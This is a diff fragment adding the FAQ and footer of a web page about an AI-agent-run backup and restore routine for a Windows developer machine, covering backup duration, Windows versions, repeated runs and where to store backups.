+    <p>No. The routine is written to be followed, not modified. You read the steps, run them, and confirm the summary at the end.</p>
+    <h3>How long does a backup take?</h3>
+    <p>Usually between twenty minutes and an hour, depending on how many projects you have and how large they are.</p>
+    <h3>Is this only for Windows 11?</h3>
+    <p>Windows 11 is the main target. Most of the routine also works on Windows 10, though a few features behave differently.</p>
+    <h3>Can I run it more than once?</h3>
+    <p>Yes, and you should. Each run creates a new dated backup, so you build up a series of restore points rather than overwriting one fragile copy.</p>
+    <h3>What happens to my old machine?</h3>
+    <p>Nothing automatic. The routine only reads and copies. Resetting or wiping the old computer stays entirely your decision, made after you have confirmed the restore worked.</p>
+    <h3>Where should I keep the backup?</h3>
+    <p>Two places is better than one. An external drive kept nearby plus a cloud folder covers the common failure cases without much effort.</p>
+  </div>
+
+  <footer>
+    <p><strong>Topics:</strong> backup, bitwarden, claude-code, developer-environment, dotfiles, pc-migration, powershell, secrets-management, windows, windows-11, winget</p>
+    <p>Notes on an iPhone-style backup and restore for a Windows dev machine run by an AI agent: secrets in Bitwarden, git bundles, Claude Code state. Rehearsed, not yet used for a real move.</p>
+  </footer>
+
+</main>
 </body>
-
 </html>
